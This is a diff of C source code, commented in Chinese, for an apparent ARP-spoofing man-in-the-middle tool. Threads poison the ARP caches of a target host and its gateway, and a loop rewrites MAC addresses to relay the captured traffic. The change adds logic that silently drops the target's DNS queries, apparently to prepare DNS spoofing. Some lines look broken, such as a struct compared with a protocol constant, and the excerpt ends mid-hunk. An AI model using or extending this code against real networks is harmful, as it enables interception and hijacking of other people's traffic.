@@ -205,46 +205,67 @@ int three()
 	pthread_create(&t, NULL, p_send_data, &arpdat); /* 开启一个线程用于dsthost欺骗 */
 	pthread_create(&t1, NULL, p_send_data, &arpdat2); /* 开启一个线程用于gateway欺骗 */
 
-	unsigned char i=0;
+    u16 _arp;
+    u16 _ipv4;
+    u16 _dns;
+    _ipv4 = htons(ipv4_prot);
+    _arp = htons(arp_prot);
+    _dns = htons(dns);
+    
+	unsigned char i = 0;
+    int send_enable = 1;
 	while(1)
 	{
 		int n = recvfrom(sock, recv_buff, 5000, 0, NULL, NULL);
         
+        ip_datagram *ip = (ip_datagram *)recv_buff;
+        send_enable = 1;
         /* 收到目标主机发送至网关的数据帧 */
-        if(recv_buff[6] == dstmac[0] && recv_buff[7] == dstmac[1] && recv_buff[8] == dstmac[2]\
-        && recv_buff[9] == dstmac[3] && recv_buff[10] == dstmac[4] && recv_buff[11] == dstmac[5])
+     //   if(ip->ethhdr.src[0] == dstmac[0] && ip->ethhdr.src[1] == dstmac[1] 
+        if(ip->ethhdr.src[0] == dstmac[0] && ip->ethhdr.src[1] == dstmac[1]\
+        && ip->ethhdr.src[2] == dstmac[2] && ip->ethhdr.src[3] == dstmac[3]\
+        && ip->ethhdr.src[4] == dstmac[4] && ip->ethhdr.src[5] == dstmac[5] )
         {
-	        if(recv_buff[12] == 0x08 && recv_buff[13] == 0x00)
+	        if(ip->ethhdr.type == _ipv4)
 	        {
-	            printf("**************dst->gateway**************\n");
-	            printf("recv %d byte data\n",n);
-	            printf("srcmac:%02x:%02x:%02x:%02x:%02x:%02x,  ",\
-	                    recv_buff[6],recv_buff[7],recv_buff[8],\
-	                    recv_buff[9],recv_buff[10],recv_buff[11]);
-	            printf("dstmac:%02x:%02x:%02x:%02x:%02x:%02x\n",\
-	                    recv_buff[0],recv_buff[1],recv_buff[2],\
-	                    recv_buff[3],recv_buff[4],recv_buff[5]);
+                if(ip->iphdr == udp_prot) /* UDP */
+                {
+                    udp_datagram *udp = (udp_datagram *)recv_buff;
+                    if(udp->udphdr.dstport == _dns) /* DNS服务 */
+                    {
+                        send_enable = 0;
+                    }
+                }
+	            // printf("**************dst->gateway**************\n");
+	            // printf("recv %d byte data\n",n);
+	            // printf("srcmac:%02x:%02x:%02x:%02x:%02x:%02x,  ",\
+	                    // recv_buff[6],recv_buff[7],recv_buff[8],\
+	                    // recv_buff[9],recv_buff[10],recv_buff[11]);
+	            // printf("dstmac:%02x:%02x:%02x:%02x:%02x:%02x\n",\
+	                    // recv_buff[0],recv_buff[1],recv_buff[2],\
+	                    // recv_buff[3],recv_buff[4],recv_buff[5]);
 	            
-	            printf("srcip:%d.%d.%d.%d,  ",\
-	                    recv_buff[26],recv_buff[27],recv_buff[28],\
-	                    recv_buff[29]);
-	            printf("dstip:%d.%d.%d.%d\n\n",\
-	                    recv_buff[30],recv_buff[31],recv_buff[32],\
-	                    recv_buff[33]);
-	            
-	            memcpy(recv_buff,gatewaymac,6);/* 修改数据包中元mac地址为本机mac，目标mac为网关mac */
-	            memcpy(recv_buff+6,localmac,6);
-	            if(n != sendto(sock, recv_buff, n, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
-	            {
-	                perror("send error");
-	            } 
+	            // printf("srcip:%d.%d.%d.%d,  ",\
+	                    // recv_buff[26],recv_buff[27],recv_buff[28],\
+	                    // recv_buff[29]);
+	            // printf("dstip:%d.%d.%d.%d\n\n",\
+	                    // recv_buff[30],recv_buff[31],recv_buff[32],\
+	                    // recv_buff[33]);
+	            if(1 == send_enable)
+                {
+                    memcpy(recv_buff,gatewaymac,6);/* 修改数据包中元mac地址为本机mac，目标mac为网关mac */
+                    memcpy(recv_buff+6,localmac,6);
+                    if(n != sendto(sock, recv_buff, n, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
+                    {
+                        perror("send error");
+                    } 
+                }
 	        }
         }
         
         /* 收到网关发送至目标主机的数据帧 */
-        if(recv_buff[6] == gatewaymac[0] && recv_buff[7] == gatewaymac[1] && recv_buff[8] == gatewaymac[2]\
-        && recv_buff[9] == gatewaymac[3] && recv_buff[10] == gatewaymac[4] && recv_buff[11] == gatewaymac[5]\
-        && recv_buff[33] == dst_host[3])
+        
+        if(ip->iphdr.dstip == dstip)
         {
             printf("**************gateway->dst**************\n");
             printf("recv %d byte data\n",n);
